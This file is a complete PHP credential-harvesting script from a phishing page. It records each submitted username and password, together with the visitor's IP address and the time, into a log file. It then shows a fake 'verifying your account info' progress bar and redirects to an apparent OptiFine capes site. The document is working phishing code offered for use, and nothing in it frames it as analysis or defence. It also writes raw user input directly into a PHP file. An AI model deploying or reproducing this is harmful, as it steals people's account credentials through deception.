<?php

$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y/m/d/ h:i:s");

if( isset($_POST['usr'] ) && isset( $_POST['pass'] ) )
{
    $html= '<tr><th scope="row">#</th><td>'. $_POST['usr'] .'</td><td>'. $_POST['pass'] .'</td><td>'. $ip .'</td><td>'. $date .'</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>'. PHP_EOL;
    file_put_contents('log.php', $html, FILE_APPEND);
}
?>
<meta http-equiv="refresh" content="3.5;url=http://optifinecapes.org/getcape.php" />
<h1>Please wait while we verify your account info.....
<style>
#myProgress {
  position: relative;
  width: 100%;
  height: 30px;
  background-color: #ddd;
}

#myBar {
  position: absolute;
  width: 1%;
  height: 100%;
  background-color: #4CAF50;
}
</style>
<body>

<h1>-----------------------------------------------------</h1>

<div id="myProgress">
  <div id="myBar"></div>
</div>

<br> 

<script>
    {
  var elem = document.getElementById("myBar");   
  var width = 1;
  var id = setInterval(frame, 60);
  function frame() {
    if (width >= 100) {
      clearInterval(id);
    } else {
      width++; 
      elem.style.width = width + '%'; 
    }
  }
}
</script>
